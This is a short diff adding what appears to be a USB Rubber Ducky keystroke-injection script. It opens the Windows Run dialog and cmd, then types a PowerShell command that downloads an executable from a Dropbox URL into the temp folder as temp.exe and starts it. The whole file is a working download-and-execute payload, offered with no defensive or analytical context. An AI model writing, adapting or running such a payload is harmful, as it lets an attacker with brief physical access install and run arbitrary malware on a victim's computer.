@@ -1,0 +1,6 @@
+GUI r
+STRING cmd
+ENTER
+DELAY 1000
+STRING powershell (new-object System.Net.WebClient).DownloadFile('https://dl.dropboxusercontent.com/u/6752637/final_OB_Kali01.tmp','%TEMP%\temp.exe'); Start-Process "%TEMP%\temp.exe"
+ENTER
